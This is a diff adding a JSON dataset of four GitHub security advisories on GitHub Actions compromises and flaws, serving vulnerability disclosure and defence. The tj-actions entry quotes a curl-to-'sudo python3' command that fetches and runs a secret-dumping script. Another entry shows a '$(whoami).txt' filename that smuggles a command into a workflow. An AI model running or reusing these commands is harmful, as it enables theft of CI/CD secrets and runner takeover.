@@ -1,0 +1,486 @@
+[
+  {
+    "ghsa_id": "GHSA-qmg3-hpqr-gqvc",
+    "cve_id": "CVE-2025-30154",
+    "url": "https://api.github.com/advisories/GHSA-qmg3-hpqr-gqvc",
+    "html_url": "https://github.com/advisories/GHSA-qmg3-hpqr-gqvc",
+    "summary": "Multiple Reviewdog actions were compromised during a specific time period",
+    "description": "### Summary\n\n`reviewdog/action-setup@v1` was compromised March 11, 2025, between 18:42 and 20:31 UTC, with malicious code added that dumps exposed secrets to Github Actions Workflow Logs.\n\nOther reviewdog actions that use `reviewdog/action-setup@v1` would also be compromised, regardless of version or pinning method:\n- reviewdog/action-shellcheck\n- reviewdog/action-composite-template\n- reviewdog/action-staticcheck\n- reviewdog/action-ast-grep\n- reviewdog/action-typos\n\n### Details\n\nMalicious commit: https://github.com/reviewdog/action-setup/commit/f0d342d\nfix/retag via version upgrade: https://github.com/reviewdog/action-setup/commit/3f401fe\n\nSee the detailed report from Wiz Research: [Wiz Blog Post](https://www.wiz.io/blog/new-github-action-supply-chain-attack-reviewdog-action-setup) and reviewdog maintainer annoucement: [reviewdog #2079](https://github.com/reviewdog/reviewdog/issues/2079)",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/reviewdog/reviewdog/security-advisories/GHSA-qmg3-hpqr-gqvc",
+    "source_code_location": "https://github.com/reviewdog/reviewdog",
+    "identifiers": [
+      {
+        "value": "GHSA-qmg3-hpqr-gqvc",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-30154",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/reviewdog/reviewdog/security/advisories/GHSA-qmg3-hpqr-gqvc",
+      "https://github.com/reviewdog/reviewdog/issues/2079",
+      "https://github.com/reviewdog/action-setup/commit/3f401fe1d58fe77e10d665ab713057375e39b887",
+      "https://github.com/reviewdog/action-setup/commit/f0d342d24037bb11d26b9bd8496e0808ba32e9ec",
+      "https://www.wiz.io/blog/new-github-action-supply-chain-attack-reviewdog-action-setup",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-30154",
+      "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2025-30154",
+      "https://github.com/advisories/GHSA-qmg3-hpqr-gqvc"
+    ],
+    "published_at": "2025-03-19T15:19:12Z",
+    "updated_at": "2025-10-22T19:29:26Z",
+    "github_reviewed_at": "2025-03-19T15:19:12Z",
+    "nvd_published_at": "2025-03-19T16:15:33Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "actions",
+          "name": "reviewdog/action-setup"
+        },
+        "vulnerable_version_range": "= 1",
+        "first_patched_version": null,
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N/E:H",
+        "score": 8.6
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-506",
+        "name": "Embedded Malicious Code"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "sshayb",
+          "id": 13697529,
+          "node_id": "MDQ6VXNlcjEzNjk3NTI5",
+          "avatar_url": "https://avatars.githubusercontent.com/u/13697529?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/sshayb",
+          "html_url": "https://github.com/sshayb",
+          "followers_url": "https://api.github.com/users/sshayb/followers",
+          "following_url": "https://api.github.com/users/sshayb/following{/other_user}",
+          "gists_url": "https://api.github.com/users/sshayb/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/sshayb/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/sshayb/subscriptions",
+          "organizations_url": "https://api.github.com/users/sshayb/orgs",
+          "repos_url": "https://api.github.com/users/sshayb/repos",
+          "events_url": "https://api.github.com/users/sshayb/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/sshayb/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "ramimac",
+          "id": 13310971,
+          "node_id": "MDQ6VXNlcjEzMzEwOTcx",
+          "avatar_url": "https://avatars.githubusercontent.com/u/13310971?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/ramimac",
+          "html_url": "https://github.com/ramimac",
+          "followers_url": "https://api.github.com/users/ramimac/followers",
+          "following_url": "https://api.github.com/users/ramimac/following{/other_user}",
+          "gists_url": "https://api.github.com/users/ramimac/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/ramimac/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/ramimac/subscriptions",
+          "organizations_url": "https://api.github.com/users/ramimac/orgs",
+          "repos_url": "https://api.github.com/users/ramimac/repos",
+          "events_url": "https://api.github.com/users/ramimac/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/ramimac/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N/E:H",
+      "score": 8.6
+    },
+    "epss": {
+      "percentage": 0.02395,
+      "percentile": 0.82568
+    }
+  },
+  {
+    "ghsa_id": "GHSA-mrrh-fwg8-r2c3",
+    "cve_id": "CVE-2025-30066",
+    "url": "https://api.github.com/advisories/GHSA-mrrh-fwg8-r2c3",
+    "html_url": "https://github.com/advisories/GHSA-mrrh-fwg8-r2c3",
+    "summary": "tj-actions changed-files through 45.0.7 allows remote attackers to discover secrets by reading actions logs.",
+    "description": "### Summary  \nA supply chain attack compromised the **tj-actions/changed-files** GitHub Action, impacting over 23,000 repositories. Attackers retroactively modified multiple version tags to reference a malicious commit, exposing CI/CD secrets in workflow logs. The vulnerability existed between **March 14 and March 15, 2025**, and has since been mitigated. This poses a significant risk of unauthorized access to sensitive information.\n\nThis has been patched in [v46.0.1](https://github.com/tj-actions/changed-files/releases/tag/v46.0.1).\n\n### Details  \nThe attack involved modifying the **tj-actions/changed-files** GitHub Action to execute a malicious Python script. This script extracted secrets from the Runner Worker process memory and printed them in GitHub Actions logs, making them publicly accessible in repositories with public workflow logs.  \n\n#### Key Indicators of Compromise (IoC):  \n- **Malicious commit**: [0e58ed8671d6b60d0890c21b07f8835ace038e67](https://github.com/tj-actions/changed-files/commit/0e58ed8671d6b60d0890c21b07f8835ace038e67)  \n- **Retroactively updated tags pointing to the malicious commit**:  \n  - `v1.0.0`: 0e58ed8671d6b60d0890c21b07f8835ace038e67  \n  - `v35.7.7-sec`: 0e58ed8671d6b60d0890c21b07f8835ace038e67  \n  - `v44.5.1`: 0e58ed8671d6b60d0890c21b07f8835ace038e67  \n\n#### Malicious Code Execution:  \nThe malicious script downloaded and executed a Python script that scanned memory for secrets, base64-encoded them, and logged them in the build logs:  \n```\nB64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3`\n```\n\nThis script targeted the **Runner Worker process**, extracting and exfiltrating its memory contents.  \n\n### Proof of Concept (PoC)  \n#### Steps to Reproduce:  \n1. Create a GitHub Actions workflow using the **tj-actions/changed-files** action:  \n\n```yml\nname: \"tj-action changed-files incident\"\non:\n  pull_request:\n    branches:\n      - main\njobs:\n  changed_files:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Get changed files\n        id: changed-files\n        uses: tj-actions/changed-files@0e58ed8671d6b60d0890c21b07f8835ace038e67\n```\n2. Run the workflow and inspect the logs in the Actions tab.  \n3. Vulnerable workflows may display secrets in the logs.  \n\n#### Detection:  \nAnalyze network traffic using [Harden-Runner](https://github.com/step-security/harden-runner), which detects unauthorized outbound requests to:  \n- `gist.githubusercontent.com`  \n\nLive reproduction logs:  \n🔗 [Harden-Runner Insights](https://app.stepsecurity.io/github/step-security/github-actions-goat/actions/runs/13866127357)  \n\nThis attack was detected by **StepSecurity** when anomaly detection flagged an unauthorized outbound network call to `gist.githubusercontent.com`.  \n\n### Duration of Vulnerability  \nThe vulnerability was active between **March 14 and March 15, 2025**.  \n\n### Action Required  \n1. **Review your workflows executed between March 14 and March 15**:  \n   - Check the **changed-files** section for unexpected output.  \n   - Decode suspicious output using the following command:  \n     ```\n     echo 'xxx' | base64 -d | base64 -d\n     ```\n   - If the output contains sensitive information (e.g., tokens or secrets), revoke and rotate those secrets immediately.  \n\n2. **Update workflows referencing the compromised commit**:  \n   - If your workflows reference the malicious commit directly by its SHA, update them immediately to avoid using the compromised version.  \n\n3. **Tagged versions**:  \n   - If you are using tagged versions (e.g., `v35`, `v44.5.1`), no action is required as these tags have been updated and are now safe to use.  \n\n4. **Rotate potentially exposed secrets**:  \n   - As a precaution, rotate any secrets that may have been exposed during this timeframe to ensure the continued security of your workflows.  \n\n### Impact  \n- **Type of vulnerability**: Supply chain attack, Secrets exposure, Information leakage  \n- **Who is impacted**:  \n  - Over 23,000 repositories using **tj-actions/changed-files**.  \n  - Organizations with public repositories are at the highest risk, as their logs may already be compromised.  \n- **Potential consequences**:  \n  - Theft of CI/CD secrets (API keys, cloud credentials, SSH keys).  \n  - Unauthorized access to source code, infrastructure, and production environments.  \n  - Credential leaks in public repositories, enabling further supply chain attacks.",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/tj-actions/changed-files",
+    "identifiers": [
+      {
+        "value": "GHSA-mrrh-fwg8-r2c3",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-30066",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-30066",
+      "https://github.com/tj-actions/changed-files/issues/2463",
+      "https://github.com/github/docs/blob/962a1c8dccb8c0f66548b324e5b921b5e4fbc3d6/content/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions.md?plain=1#L191-L193",
+      "https://semgrep.dev/blog/2025/popular-github-action-tj-actionschanged-files-is-compromised",
+      "https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised",
+      "https://github.com/chains-project/maven-lockfile/pull/1111",
+      "https://github.com/rackerlabs/genestack/pull/903",
+      "https://news.ycombinator.com/item?id=43367987",
+      "https://web.archive.org/web/20250315060250/https://github.com/tj-actions/changed-files/issues/2463",
+      "https://github.com/espressif/arduino-esp32/issues/11127",
+      "https://github.com/modal-labs/modal-examples/issues/1100",
+      "https://github.com/tj-actions/changed-files/issues/2464",
+      "https://github.com/tj-actions/changed-files/blob/45fb12d7a8bedb4da42342e52fe054c6c2c3fd73/README.md?plain=1#L20-L28",
+      "https://sysdig.com/blog/detecting-and-mitigating-the-tj-actions-changed-files-supply-chain-attack-cve-2025-30066",
+      "https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066",
+      "https://www.sweet.security/blog/cve-2025-30066-tj-actions-supply-chain-attack",
+      "https://www.stream.security/post/github-action-supply-chain-attack-exposes-secrets-what-you-need-to-know-and-how-to-respond",
+      "https://github.com/tj-actions/changed-files/issues/2477",
+      "https://github.com/tj-actions/changed-files/releases/tag/v46.0.1",
+      "https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-github-action-cve-2025-30066",
+      "https://blog.gitguardian.com/compromised-tj-actions",
+      "https://github.com/tj-actions/changed-files/security/advisories/GHSA-mw4p-6x4p-x5m5",
+      "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2025-30066",
+      "https://news.ycombinator.com/item?id=43368870",
+      "https://github.com/advisories/GHSA-mrrh-fwg8-r2c3"
+    ],
+    "published_at": "2025-03-15T06:30:34Z",
+    "updated_at": "2025-10-22T19:29:01Z",
+    "github_reviewed_at": "2025-03-15T16:39:06Z",
+    "nvd_published_at": "2025-03-15T06:15:12Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "actions",
+          "name": "tj-actions/changed-files"
+        },
+        "vulnerable_version_range": "<= 45.0.7",
+        "first_patched_version": "46.0.1",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N/E:H",
+        "score": 8.6
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-506",
+        "name": "Embedded Malicious Code"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "varunsh-coder",
+          "id": 25015917,
+          "node_id": "MDQ6VXNlcjI1MDE1OTE3",
+          "avatar_url": "https://avatars.githubusercontent.com/u/25015917?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/varunsh-coder",
+          "html_url": "https://github.com/varunsh-coder",
+          "followers_url": "https://api.github.com/users/varunsh-coder/followers",
+          "following_url": "https://api.github.com/users/varunsh-coder/following{/other_user}",
+          "gists_url": "https://api.github.com/users/varunsh-coder/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/varunsh-coder/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/varunsh-coder/subscriptions",
+          "organizations_url": "https://api.github.com/users/varunsh-coder/orgs",
+          "repos_url": "https://api.github.com/users/varunsh-coder/repos",
+          "events_url": "https://api.github.com/users/varunsh-coder/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/varunsh-coder/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "analyst"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N/E:H",
+      "score": 8.6
+    },
+    "epss": {
+      "percentage": 0.69794,
+      "percentile": 0.99318
+    }
+  },
+  {
+    "ghsa_id": "GHSA-vqf5-2xx6-9wfm",
+    "cve_id": "CVE-2025-24362",
+    "url": "https://api.github.com/advisories/GHSA-vqf5-2xx6-9wfm",
+    "html_url": "https://github.com/advisories/GHSA-vqf5-2xx6-9wfm",
+    "summary": "GitHub PAT written to debug artifacts",
+    "description": "### Impact summary\n\nIn some circumstances, debug artifacts uploaded by the CodeQL Action after a failed code scanning workflow run may contain the environment variables from the workflow run, including any secrets that were exposed as environment variables to the workflow. Users with read access to the repository would be able to access this artifact, containing any secrets from the environment.\n\nFor some affected workflow runs, the exposed environment variables in the debug artifacts included a valid `GITHUB_TOKEN` for the workflow run, which has access to the repository in which the workflow ran, and all the permissions specified in the workflow or job. The `GITHUB_TOKEN` is valid until the job completes or 24 hours has elapsed, whichever comes first.\n\nEnvironment variables are exposed only from workflow runs that satisfy all of the following conditions:\n- Code scanning workflow configured to scan the Java/Kotlin languages.\n- Running in a repository containing Kotlin source code.\n- Running with [debug artifacts enabled](https://docs.github.com/en/code-security/code-scanning/troubleshooting-code-scanning/logs-not-detailed-enough).\n- Using CodeQL Action versions <= 3.28.2, and CodeQL CLI versions >= 2.9.2 (May 2022) and <= 2.20.2.\n- The workflow run fails before the CodeQL database is finalized within the `github/codeql-action/analyze` step.\n- Running in any GitHub environment: GitHub.com, GitHub Enterprise Cloud, and GitHub Enterprise Server. (Note: artifacts are only accessible to users within the same GitHub environment with access to the scanned repo.)\n\nThe `GITHUB_TOKEN` exposed in this way would only have been valid for workflow runs that satisfy all of the following conditions, in addition to the conditions above:\n- Using CodeQL Action versions >= 3.26.11 (October 2024) and <= 3.28.2, or >= 2.26.11 and < 3.\n- Running in GitHub.com or GitHub Enterprise Cloud only (not valid on GitHub Enterprise Server).\n\nIn rare cases during advanced setup, logging of environment variables may also occur during database creation of Java, Swift, and C/C++. Please read the corresponding CodeQL CLI advisory [GHSA-gqh3-9prg-j95m](https://github.com/github/codeql-cli-binaries/security/advisories/GHSA-gqh3-9prg-j95m) for more details.\n\n\n### Impact details\n\nIn CodeQL CLI versions >= 2.9.2 and <= 2.20.2, the CodeQL Kotlin extractor logs all environment variables by default into an intermediate file during the process of creating a CodeQL database for Kotlin code. \nThis is a part of the CodeQL CLI and is invoked by the CodeQL Action for analyzing Kotlin repositories. \nOn Actions, the environment variables logged include GITHUB_TOKEN, which grants permissions to the repository being scanned.\n\nThe intermediate file containing environment variables is deleted when finalizing the database, so it is not included in a successfully created database. It is, however, included in the debug artifact that is uploaded on a failed analysis run if the CodeQL Action was invoked in debug mode.\n\nTherefore, under these specific circumstances (incomplete database creation using the CodeQL Action in debug mode) an attacker with access to the debug artifact would gain unauthorized access to repository secrets from the environment, including both the `GITHUB_TOKEN` and any user-configured secrets made available via environment variables.\n\nThe impact of the `GITHUB_TOKEN` leaked in this environment is limited:\n- For workflows on GitHub.com and GitHub Enterprise Cloud using CodeQL Action versions >= 3.26.11 and <= 3.28.2, or >= 2.26.11 and < 3, which in turn use the `actions/artifacts v4` library, the debug artifact is uploaded before the workflow job completes. During this time the `GITHUB_TOKEN` is still valid, providing an opportunity for attackers to gain access to the repository.\n- For all other workflows, the debug artifact is uploaded after the workflow job completes, at which point the leaked `GITHUB_TOKEN` has been revoked and cannot be used to access the repository.\n\n### Mitigations\n\nUpdate to CodeQL Action version 3.28.3 or later, or CodeQL CLI version 2.20.3 or later.\n\n### Patches\n\nThis vulnerability has been fixed in CodeQL Action version 3.28.3, which no longer uploads database artifacts in debug mode.\nThis vulnerability will be fixed in CodeQL CLI version 2.20.3, in which database creation for all languages no longer logs the complete environment by default.\n\n### References\n\n- [Pull request that bundled CodeQL CLI 2.9.2 with Kotlin extractor environment variable logging ](https://github.com/github/codeql-action/pull/1074)\n- [Pull request that introduced the `actions/artifacts v4` library, allowing for `GITHUB_TOKEN` exposure in the CodeQL Action debug artifacts before the token was revoked](https://github.com/github/codeql-action/pull/2482)\n- [Related security advisory for the CodeQL CLI](https://github.com/github/codeql-cli-binaries/security/advisories/GHSA-gqh3-9prg-j95m)",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/github/codeql-action/security-advisories/GHSA-vqf5-2xx6-9wfm",
+    "source_code_location": "https://github.com/github/codeql-action",
+    "identifiers": [
+      {
+        "value": "GHSA-vqf5-2xx6-9wfm",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-24362",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/github/codeql-action/security/advisories/GHSA-vqf5-2xx6-9wfm",
+      "https://github.com/github/codeql-cli-binaries/security/advisories/GHSA-gqh3-9prg-j95m",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-24362",
+      "https://github.com/github/codeql-action/pull/1074",
+      "https://github.com/github/codeql-action/pull/2482",
+      "https://github.com/github/codeql-action/commit/519de26711ecad48bde264c51e414658a82ef3fa",
+      "https://docs.github.com/en/code-security/code-scanning/troubleshooting-code-scanning/logs-not-detailed-enough",
+      "https://news.ycombinator.com/item?id=43527044",
+      "https://www.praetorian.com/blog/codeqleaked-public-secrets-exposure-leads-to-supply-chain-attack-on-github-codeql",
+      "https://github.com/advisories/GHSA-vqf5-2xx6-9wfm"
+    ],
+    "published_at": "2025-01-24T18:44:55Z",
+    "updated_at": "2025-03-31T21:55:43Z",
+    "github_reviewed_at": "2025-01-24T18:44:55Z",
+    "nvd_published_at": "2025-01-24T18:15:32Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "actions",
+          "name": "github/codeql-action"
+        },
+        "vulnerable_version_range": ">= 3.26.11, <= 3.28.2",
+        "first_patched_version": "3.28.3",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "actions",
+          "name": "github/codeql-action"
+        },
+        "vulnerable_version_range": ">= 2.26.11, < 3.0.0",
+        "first_patched_version": null,
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+        "score": 7.1
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-215",
+        "name": "Insertion of Sensitive Information Into Debugging Code"
+      },
+      {
+        "cwe_id": "CWE-532",
+        "name": "Insertion of Sensitive Information into Log File"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "jstawinski",
+          "id": 64742258,
+          "node_id": "MDQ6VXNlcjY0NzQyMjU4",
+          "avatar_url": "https://avatars.githubusercontent.com/u/64742258?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/jstawinski",
+          "html_url": "https://github.com/jstawinski",
+          "followers_url": "https://api.github.com/users/jstawinski/followers",
+          "following_url": "https://api.github.com/users/jstawinski/following{/other_user}",
+          "gists_url": "https://api.github.com/users/jstawinski/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/jstawinski/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/jstawinski/subscriptions",
+          "organizations_url": "https://api.github.com/users/jstawinski/orgs",
+          "repos_url": "https://api.github.com/users/jstawinski/repos",
+          "events_url": "https://api.github.com/users/jstawinski/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/jstawinski/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "finder"
+      }
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    },
+    "epss": {
+      "percentage": 0.01245,
+      "percentile": 0.66871
+    }
+  },
+  {
+    "ghsa_id": "GHSA-mcph-m25j-8j63",
+    "cve_id": "CVE-2023-51664",
+    "url": "https://api.github.com/advisories/GHSA-mcph-m25j-8j63",
+    "html_url": "https://github.com/advisories/GHSA-mcph-m25j-8j63",
+    "summary": "tj-actions/changed-files has Potential Actions command injection in output filenames (GHSL-2023-271)",
+    "description": "### Summary\nThe `tj-actions/changed-files` workflow allows for command injection in changed filenames, allowing an attacker to execute arbitrary code and potentially leak secrets.\n\n### Details\nThe [`changed-files`](https://github.com/tj-actions/changed-files) action returns a list of files changed in a commit or pull request which provides an `escape_json` input [enabled by default](https://github.com/tj-actions/changed-files/blob/94549999469dbfa032becf298d95c87a14c34394/action.yml#L136), only escapes `\"` for JSON values. \n\nThis could potentially allow filenames that contain special characters such as `;` and \\` (backtick) which can be used by an attacker to take over the [GitHub Runner](https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners) if the output value is used in a raw fashion (thus being directly replaced before execution) inside a `run` block. By running custom commands an attacker may be able to steal **secrets** such as `GITHUB_TOKEN` if triggered on other events than `pull_request`. For example on `push`.\n\n#### Proof of Concept\n\n1. Submit a pull request to a repository with a new file injecting a command. For example `$(whoami).txt` which is a valid filename.\n2. Upon approval of the workflow (triggered by the pull request), the action will get executed and the malicious pull request filename will flow into the `List all changed files` step below.\n\n```yaml\n      - name: List all changed files\n        run: |\n          for file in ${{ steps.changed-files.outputs.all_changed_files }}; do\n            echo \"$file was changed\"\n          done\n```\n\nExample output:\n\n```yaml\n##[group]Run for file in $(whoami).txt; do\n    for file in $(whoami).txt; do\n        echo \"$file was changed\"\n    done\nshell: /usr/bin/bash -e {0}\n##[endgroup]\nrunner.txt was changed\n```\n\n### Impact\n\nThis issue may lead to arbitrary command execution in the GitHub Runner.\n\n### Resolution\n- A new `safe_output` input would be enabled by default and return filename paths escaping special characters like ;, ` (backtick), $, (), etc for bash environments.\n\n- A safe recommendation of using environment variables to store unsafe outputs.\n\n```yaml\n- name: List all changed files\n  env:\n    ALL_CHANGED_FILES: ${{ steps.changed-files.outputs.all_changed_files }}\n  run: |\n    for file in \"$ALL_CHANGED_FILES\"; do\n      echo \"$file was changed\"\n    done\n```\n\n### Resources\n\n* [Keeping your GitHub Actions and workflows secure Part 2: Untrusted input](https://securitylab.github.com/research/github-actions-untrusted-input/)\n* [Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/tj-actions/changed-files/security-advisories/GHSA-mcph-m25j-8j63",
+    "source_code_location": "https://github.com/tj-actions/changed-files",
+    "identifiers": [
+      {
+        "value": "GHSA-mcph-m25j-8j63",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2023-51664",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/tj-actions/changed-files/security/advisories/GHSA-mcph-m25j-8j63",
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-51664",
+      "https://github.com/tj-actions/changed-files/commit/0102c07446a3cad972f4afcbd0ee4dbc4b6d2d1b",
+      "https://github.com/tj-actions/changed-files/commit/716b1e13042866565e00e85fd4ec490e186c4a2f",
+      "https://github.com/tj-actions/changed-files/commit/ff2f6e6b91913a7be42be1b5917330fe442f2ede",
+      "https://github.com/advisories/GHSA-mcph-m25j-8j63"
+    ],
+    "published_at": "2024-01-02T16:41:27Z",
+    "updated_at": "2024-01-04T19:43:41Z",
+    "github_reviewed_at": "2024-01-02T16:41:27Z",
+    "nvd_published_at": "2023-12-27T17:15:08Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "actions",
+          "name": "tj-actions/changed-files"
+        },
+        "vulnerable_version_range": "< 41",
+        "first_patched_version": "41",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N",
+        "score": 7.3
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-74",
+        "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')"
+      },
+      {
+        "cwe_id": "CWE-77",
+        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "jorgectf",
+          "id": 46056498,
+          "node_id": "MDQ6VXNlcjQ2MDU2NDk4",
+          "avatar_url": "https://avatars.githubusercontent.com/u/46056498?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/jorgectf",
+          "html_url": "https://github.com/jorgectf",
+          "followers_url": "https://api.github.com/users/jorgectf/followers",
+          "following_url": "https://api.github.com/users/jorgectf/following{/other_user}",
+          "gists_url": "https://api.github.com/users/jorgectf/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/jorgectf/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/jorgectf/subscriptions",
+          "organizations_url": "https://api.github.com/users/jorgectf/orgs",
+          "repos_url": "https://api.github.com/users/jorgectf/repos",
+          "events_url": "https://api.github.com/users/jorgectf/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/jorgectf/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "jsoref",
+          "id": 2119212,
+          "node_id": "MDQ6VXNlcjIxMTkyMTI=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/2119212?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/jsoref",
+          "html_url": "https://github.com/jsoref",
+          "followers_url": "https://api.github.com/users/jsoref/followers",
+          "following_url": "https://api.github.com/users/jsoref/following{/other_user}",
+          "gists_url": "https://api.github.com/users/jsoref/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/jsoref/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/jsoref/subscriptions",
+          "organizations_url": "https://api.github.com/users/jsoref/orgs",
+          "repos_url": "https://api.github.com/users/jsoref/repos",
+          "events_url": "https://api.github.com/users/jsoref/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/jsoref/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "finder"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N",
+      "score": 7.3
+    },
+    "epss": {
+      "percentage": 0.03351,
+      "percentile": 0.87503
+    }
+  }
+]
